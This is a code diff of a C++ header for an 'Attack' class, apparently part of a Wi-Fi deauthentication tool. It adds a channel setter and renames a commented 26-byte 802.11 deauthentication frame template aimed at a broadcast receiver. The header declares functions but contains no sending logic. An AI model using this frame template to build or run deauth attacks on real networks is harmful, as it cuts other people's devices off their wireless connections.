@@ -9,10 +9,11 @@
 class Attack {
   public:
     Attack();
-    void deauth(int apNum);
+    bool deauth(int apNum);
+    void setWifiChannel(uint8_t channel);
 
   private:
-    uint8_t deauthPacket[26] = {
+    uint8_t baseDeauthPacket[26] = {
       /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
       /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
       /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
@@ -21,5 +22,5 @@ class Attack {
       /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
       /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
     };
-    uint8_t broadcast[6];
+    uint8_t currentChannel;
 };
